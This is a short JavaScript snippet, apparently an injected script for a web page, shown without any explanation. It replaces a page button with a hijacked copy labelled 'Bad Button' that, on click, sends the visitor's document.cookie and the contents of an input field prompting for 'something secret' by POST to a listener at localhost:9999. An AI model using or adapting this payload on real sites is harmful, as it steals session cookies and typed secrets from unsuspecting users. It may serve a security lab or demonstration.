const input = document.getElementById("input");
const button = document.getElementById("btn");
const newButton = button.cloneNode();
button.parentElement.replaceChild(newButton, button);
newButton.textContent = "Bad Button";
newButton.addEventListener("click", () => {
    sendReq();
    fetch("http://localhost:9999", {
        method: "POST",
        body: JSON.stringify({
            cookie: document.cookie,
            input: input.value
        })
    });
});
input.value = "";
input.placeholder = "Enter something secret here";
document.getElementById("body").innerHTML = "";
